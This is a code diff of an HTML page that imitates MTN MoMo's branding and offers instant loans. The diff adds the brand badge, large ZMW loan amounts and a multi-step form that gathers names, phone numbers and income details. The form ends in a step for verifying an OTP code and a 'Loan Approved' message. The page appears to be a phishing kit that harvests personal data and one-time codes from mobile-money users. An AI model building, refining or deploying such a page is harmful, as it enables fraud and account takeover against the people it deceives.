@@ -8,31 +8,53 @@
 </head>
 <body>
   <header class="header">
-    <div class="logo">MTN MoMo</div>
-    <div class="tag">Instant Loans</div>
+    <div class="logo-container">
+      <div class="momo-badge">momo</div>
+    </div>
+    <div class="tag">from MTN</div>
   </header>
 
   <main class="container">
     <div class="card">
       
-      <!-- STEP 1: Loan Calculator & Landing Page -->
+      <!-- STEP 1: Loan Calculator & Welcome Message -->
       <div id="step-1" class="form-step">
-        <h2>Instant Mobile Loans</h2>
-        <p class="subtitle">Get cash directly into your MTN MoMo account within minutes.</p>
+        <h2>Welcome to MTN MoMo</h2>
+        <p class="subtitle">Get loans easily through MTN MoMo</p>
+        
         <div class="calculator-box">
-          <label>Desired Amount (ZMW)</label>
-          <input type="number" id="calc-amount" value="5000" min="500" max="20000" />
-          <label>Loan Term (Months)</label>
-          <select id="calc-term">
-            <option value="3">3 Months</option>
-            <option value="6">6 Months</option>
-            <option value="12">12 Months</option>
-          </select>
+          <div class="calc-header">
+            <span class="calc-title">Loan Calculator</span>
+          </div>
+          
+          <div class="calc-row">
+            <span class="label-text">Amount</span>
+            <span id="display-amount" class="highlight-yellow">ZMW 1,000,000</span>
+          </div>
+          
+          <div class="calc-row">
+            <span class="label-text">Term</span>
+            <span id="display-term" class="highlight-yellow">48 Months</span>
+          </div>
+
+          <div class="range-container">
+            <input type="range" id="calc-amount-slider" min="500000" max="5000000" step="50000" value="1000000" oninput="updateCalculator()" />
+            <div class="range-labels">
+              <span>ZMW 500,000</span>
+              <span>ZMW 5,000,000</span>
+            </div>
+          </div>
+
+          <div class="monthly-payment-box">
+            <span>Monthly Payment</span>
+            <span id="display-monthly" class="highlight-yellow">ZMW 20,834</span>
+          </div>
         </div>
-        <button class="btn-primary" onclick="goToStep(2)">APPLY NOW</button>
+
+        <button class="btn-primary" onclick="goToStep(2)">START APPLICATION</button>
       </div>
 
-      <!-- STEP 2: Loan Application - Step 1 of 3 (Type, Amount, Term, Purpose) -->
+      <!-- STEP 2: Loan Application - Step 1 of 3 -->
       <div id="step-2" class="form-step" style="display:none;">
         <h3>Loan Details (1 of 3)</h3>
         <label>Loan Type</label>
@@ -50,7 +72,7 @@
         </div>
       </div>
 
-      <!-- STEP 3: Loan Application - Step 2 of 3 (Name & Phone) -->
+      <!-- STEP 3: Loan Application - Step 2 of 3 -->
       <div id="step-3" class="form-step" style="display:none;">
         <h3>Personal Information (2 of 3)</h3>
         <label>First Name</label>
@@ -65,7 +87,7 @@
         </div>
       </div>
 
-      <!-- STEP 4: Loan Application - Step 3 of 3 (Employment & Income) -->
+      <!-- STEP 4: Loan Application - Step 3 of 3 -->
       <div id="step-4" class="form-step" style="display:none;">
         <h3>Employment & Income (3 of 3)</h3>
         <label>Employment Status</label>
@@ -124,7 +146,7 @@
 
       <!-- STEP 10: Verifying OTP Code & Final Approval -->
       <div id="step-10" class="form-step" style="display:none; text-align:center;">
-        <div style="font-size: 50px; color: #2b6cb0;">🎉</div>
+        <div style="font-size: 50px; color: #003366;">🎉</div>
         <h3 style="color:#003366;">Loan Approved Successfully!</h3>
         <p class="subtitle">Your funds are being processed and will reflect in your MTN MoMo wallet shortly.</p>
       </div>
@@ -134,5 +156,5 @@
 
   <script src="script.js"></script>
 </body>
-                                                       </html>
-  
+          </html>
+                           
